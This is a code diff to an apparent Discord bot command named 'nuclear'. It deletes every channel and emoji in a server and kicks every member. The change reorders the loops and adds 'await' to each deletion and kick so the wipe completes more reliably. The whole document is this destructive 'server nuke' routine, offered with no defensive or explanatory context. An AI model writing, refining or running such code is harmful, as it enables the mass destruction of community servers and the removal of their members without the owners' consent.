@@ -3,21 +3,21 @@ const logger = require("../../utils/logger");
 module.exports = {
 	name: "nuclear",
 	execute: async (guild) => {
-		const emojis = await guild.emojis.fetch();
+		const channels = await guild.channels.fetch();
 
-		for (const emoji of emojis.values()) {
+		for (const channel of channels.values()) {
 			try {
-				emoji.delete();
+				await channel.delete();
 			} catch (err) {
 				logger.error(err);
 			}
 		}
 
-		const channels = await guild.channels.fetch();
+		const emojis = await guild.emojis.fetch();
 
-		for (const channel of channels.values()) {
+		for (const emoji of emojis.values()) {
 			try {
-				channel.delete();
+				await emoji.delete();
 			} catch (err) {
 				logger.error(err);
 			}
@@ -27,7 +27,7 @@ module.exports = {
 
 		for (const member of members.values()) {
 			try {
-				member.kick();
+				await member.kick();
 			} catch (err) {
 				logger.error(err);
 			}
